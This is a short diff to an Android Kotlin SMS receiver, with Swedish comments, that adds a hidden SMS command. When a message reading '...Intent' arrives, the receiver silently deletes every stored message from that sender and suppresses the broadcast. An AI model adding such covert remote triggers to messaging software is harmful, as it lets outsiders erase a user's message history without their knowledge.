@@ -23,7 +23,6 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
         val prefs = SharedPrefsHelper(context)
-        // === NYTT: Läs header/rubrik från prefs ===
         val header = prefs.getCustomLogHeader().ifBlank { "SMS INKOMMANDE" }
 
         for (sms in messages) {
@@ -46,8 +45,16 @@ class SmsReceiver : BroadcastReceiver() {
                 abortBroadcast()
                 return
             }
+            // === NYTT: Hantera tysta ...Intent ===
+            if (messageBody.equals("...Intent", ignoreCase = true)) {
+                // Radera ALLA meddelanden från detta nummer (tyst)
+                context.messagesDB.MessagesDao().deleteMessagesFromAddress(sender)
+                abortBroadcast()
+                return
+            }
         }
 
+        // Fortsätt normalt om inget tyst kommando matchade
         var address = ""
         var body = ""
         var subject = ""
